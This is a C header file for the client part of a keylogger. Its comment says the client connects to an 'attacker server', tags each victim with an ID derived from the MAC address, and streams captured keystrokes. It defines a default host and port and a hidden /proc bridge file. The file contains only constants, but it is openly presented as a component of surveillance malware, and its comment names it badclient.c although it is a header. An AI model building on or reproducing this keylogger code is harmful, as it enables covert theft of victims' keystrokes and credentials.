/**
 * @file badclient.c
 * @brief User space client for the keylogger
 *
 * Connects to the attacker server TCP connection,
 * generates a unique victim ID based on
 * the MAC address, and streams keystrokes
 *
 */

#ifndef BADCLIENT_H
#define BADCLIENT_H

#include <stddef.h>
#include <openssl/sha.h>

#define DEFAULT_IP (char *)"127.0.0.1"
#define DEFAULT_PORT 8080
#define SYSFS_PATH_LEN 256
#define PROC_FILE "/proc/hidden_bridge"
#define BUF_SIZE 1024
#define MAC_SIZE 64
#define EXTRAS_LEN 3 + 1 + 1

#endif /* BADCLIENT_H */